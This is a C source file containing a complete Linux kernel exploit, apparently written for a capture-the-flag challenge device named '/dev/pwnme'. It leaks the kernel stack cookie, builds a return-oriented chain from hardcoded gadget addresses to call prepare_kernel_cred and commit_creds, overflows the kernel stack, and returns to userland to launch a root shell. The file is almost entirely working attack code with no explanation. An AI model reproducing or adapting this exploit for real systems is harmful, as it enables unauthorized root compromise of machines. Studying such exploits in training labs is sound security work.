#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>


int global_fd;

void open_dev(){
    global_fd = open("/dev/pwnme", O_RDWR);
	if (global_fd < 0){
		puts("[!] Failed to open device");
		exit(-1);
	} else {
        puts("[*] Opened device");
    }
}

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void print_leak(unsigned long *leak, unsigned n) {
    for (unsigned i = 0; i < n; ++i) {
        printf("%u: %lx\n", i, leak[i]);
    }
}

unsigned long cookie;

void leak(void){
    unsigned n = 20;
    unsigned long leak[n];
    ssize_t r = read(global_fd, leak, sizeof(leak));
    cookie = leak[10];

    printf("[*] Leaked %zd bytes\n", r);
    print_leak(leak, n);
    printf("[*] Cookie: %lx\n", cookie);
}

void get_shell(void){

	
	//char flag[0x30];
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    } 
}
unsigned long init_task = 0xffffffff8181e540;
unsigned long prepare_kernel_cred = 0xffffffff81073da0;
unsigned long commit_creds = 0xffffffff81073ab0;
unsigned long pop_rdi = 0xffffffff8120d97f;// pop rdx; pop rdi; ret;
unsigned long mov_rdi_rax_pop_pop_pop_pop= 0xffffffff81327df4;
unsigned long kpti = 0xffffffff814014b0 + 22;
unsigned long user_rip = (unsigned long)get_shell;
unsigned long swapgs=0xffffffff813308b8;
unsigned long iretq=0xffffffff814017ea;  //pop rdx; iretq;
unsigned long push_rax=0xffffffff81256c00; // push rax; clc; ret;
unsigned long mov_rdi=0xffffffff8104aea3;


void escalate_privs(void){
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff81073ff0;" //cred_alloc_blank
        "call rax ;" 
        "mov rdi,rax ;"	
	    "movabs rax, 0xffffffff81073ab0;" //commit_creds
	    "call rax;"
        "swapgs;"
        " push user_ss;"
        "push user_sp;"
        "push user_rflags;"
        "push user_cs;"
        "push user_rip;"
        "iretq;"
	".att_syntax;"
    );
}

void overflow(void){
    unsigned n = 60;
    unsigned long payload[n];
    unsigned off = 10;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = (unsigned long)pop_rdi; // ret
    payload[off++] = (unsigned long)0; // ret
    payload[off++] = (unsigned long)init_task; // ret
    payload[off++] = (unsigned long)prepare_kernel_cred; // ret
    payload[off++] = (unsigned long)mov_rdi_rax_pop_pop_pop_pop; // ret
    payload[off++] = (unsigned long)0;
    payload[off++] = (unsigned long)0;
    payload[off++] = (unsigned long)0;
    payload[off++] = (unsigned long)0; // ret
    payload[off++] = (unsigned long)commit_creds; // ret
    payload[off++] = (unsigned long)swapgs; // ret
    payload[off++] = (unsigned long)iretq; // ret
    payload[off++] = (unsigned long)0; // ret
    payload[off++] = (unsigned long)get_shell;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Prepared payload");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
}

int main() {

    save_state();

    open_dev();

    leak();

    overflow();
    
    puts("[!] Should never be reached");

    return 0;
}
